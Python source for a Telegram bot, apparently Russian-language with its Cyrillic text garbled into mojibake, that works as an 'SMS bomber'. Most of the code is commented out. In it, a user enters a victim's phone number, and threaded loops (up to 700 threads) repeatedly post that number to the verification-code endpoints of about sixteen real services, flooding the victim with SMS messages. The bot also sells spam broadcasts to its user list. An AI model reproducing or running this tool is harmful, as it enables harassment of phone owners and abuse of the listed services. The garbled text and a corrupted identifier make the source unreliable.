import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time

TOKEN = '–¢–æ–∫–µ–Ω'

THREADS_LIMIT = 700

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = "My Id"

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "–§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª—è–µ—Ç —á–∞—Ç –∞–π–¥–∏ –≤ —Ñ–∞–π–ª –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç—É"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(
            f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


# @bot.message_handler(commands=['start'])
# def start(message):
#     keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
#     boom = types.KeyboardButton(text='–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä')
#     stop = types.KeyboardButton(text='–°—Ç–æ–ø –°–ø–∞–º')
#     piar = types.KeyboardButton(text='–†–µ–∫–ª–∞–º–∞')
#     stats = types.KeyboardButton(text='–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')

#     buttons_to_add = [boom, stop, stats, piar]

#     if int(message.chat.id) == ADMIN_CHAT_ID:
#         buttons_to_add.append(types.KeyboardButton(text='–†–∞—Å—Å—ã–ª–∫–∞'))

#     keyboard.add(*buttons_to_add)
#     bot.send_message(
#         message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—åüôã‚Äç‚ôÇ!\n–ù–∞—à –∫–∞–Ω–∞–ª: @cyberland_x\n–û—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –≤–∞—à–∏ –¥–µ–π—Å—Ç–≤–∏—è –Ω–µ—Å–µ—Ç–µ –ª–∏—á–Ω–æ –≤—ã!\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:',  reply_markup=keyboard)
#     save_chat_id(message.chat.id)


# def send_for_number(phone):
#         request_timeout = 0.00001
#         while True:
#          requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
#          requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
#          requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
#          requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
#          requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.–ó–∞—è–≤–∫–∞–ù–∞–§–∏–∑–∏–∫–∞','params':{'phone':phone},'id':'1'})
#          requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
#          requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
#          requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + phone})
#          requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
#          requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
#          requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone})
#          requests.post('https://www.rabota.ru/remind', data={'credential': phone})
#          requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
#          requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
#          requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})


# def start_spam(chat_id, phone_number, force):
#     running_spams_per_chat_id.append(chat_id)

#     if force:
#         msg = f'–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–æ–º–µ—Ä–∞ +{phone_number}'
#     else:
#          msg = f'–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ 10 –º–∏–Ω—É—Ç –Ω–∞ –Ω–æ–º–µ—Ä +{phone_number}'

#     bot.send_message(chat_id, msg)
#     end = datetime.now() + timedelta(minutes = 10)
#     while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
#         if chat_id not in running_spams_per_chat_id:
#             break
#         send_for_number(phone_number)
#     bot.send_message(chat_id, f'–°–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä {phone_number} –∑–∞–≤–µ—Ä—à—ë–Ω')
#     THREADS_AMOUNT[0] -= 1 # —Å—Ç–æ—è–ª–æ 1
#     try:
#         running_spams_per_c–∑–Ωhat_id.remove(chat_id)
#     except Exception:
#         pass


# def spam_handler(phone, chat_id, force):
#     if int(chat_id) in running_spams_per_chat_id:
#         bot.send_message(chat_id, '–í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –°—Ç–æ–ø –°–ø–∞–º –∏ –ø–æ—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞')
#         return

#     # –ï—Å–ª–∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –º–µ–Ω—å—à–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π –∫–æ—Ç–æ—Ä—ã–π –∑–∞–Ω–∏–º–∞–µ—Ç—Å—è —Å–ø–∞–º–æ–º
#     if THREADS_AMOUNT[0] < THREADS_LIMIT:
#         x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
#         threads.append(x)
#         THREADS_AMOUNT[0] += 1
#         x.start()
#     else:
#         bot.send_message(chat_id, '–°–µ—Ä–≤–µ—Ä–∞ —Å–µ–π—á–∞—Å –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã. –ü–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç')
#         print('–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è. –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.')


# @bot.message_handler(content_types=['text'])
# def handle_message_received(message):
#     chat_id = int(message.chat.id)
#     text = message.text

#     if text == '–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä':
#         bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –±–µ–∑ + –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\nüá∫üá¶ 380xxxxxxxxx\nüá∑üá∫ 79xxxxxxxxx')

#     elif text == '–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
#         bot.send_message(chat_id, f'üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏üì°!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–πüôé‚Äç‚ôÇ: {users_amount[0]}\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è RUüá∑üá∫: 25\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è UKüá∫üá¶: 10\n–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: 12.06.2019')

#     elif text == '–†–µ–∫–ª–∞–º–∞':
#         bot.send_message(chat_id, '–í –ù–∞—à–µ–º –ë–æ—Ç–µ 1 —Ä–∞—Å—Å—ã–ª–∫–∞ —Å—Ç–æ–∏—Ç  100 —Ä—É–±–ª–µ–π\n–ï–µ –ø–æ–ª—É—á–∞—Ç –≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±–æ—Ç–∞\n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–∫—É–ø–∫–∏ –ø–∏—Å–∞—Ç—å @TRILD')

#     elif text == '–†–∞—Å—Å—ã–ª–∫–∞' and chat_id==ADMIN_CHAT_ID:
#         bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: "–†–ê–ó–û–°–õ–ê–¢–¨: –≤–∞—à_—Ç–µ–∫—Å—Ç" –±–µ–∑ –∫–∞–≤—ã—á–µ–∫')

#     elif text == '–°—Ç–æ–ø –°–ø–∞–º':
#         if chat_id not in running_spams_per_chat_id:
#             bot.send_message(chat_id, '–í—ã –µ—â–µ –Ω–µ –Ω–∞—á–∏–Ω–∞–ª–∏ —Å–ø–∞–º')
#         else:
#             running_spams_per_chat_id.remove(chat_id)

#     elif '–†–ê–ó–û–°–õ–ê–¢–¨: ' in text and chat_id==ADMIN_CHAT_ID:
#         msg = text.replace("–†–ê–ó–û–°–õ–ê–¢–¨: ","")
#         send_message_users(msg)

#     elif len(text) == 11:
#         phone = text
#         spam_handler(phone, chat_id, force=False)


#     elif len(text) == 12:
#         phone = text
#         spam_handler(phone, chat_id, force=False)


#     elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
#         phone = text[1:]
#         spam_handler(phone, chat_id, force=True)

#     else:
#         bot.send_message(chat_id, f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')
#         print(f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')

# if __name__ == '__main__':
#     bot.polling(none_stop=True)
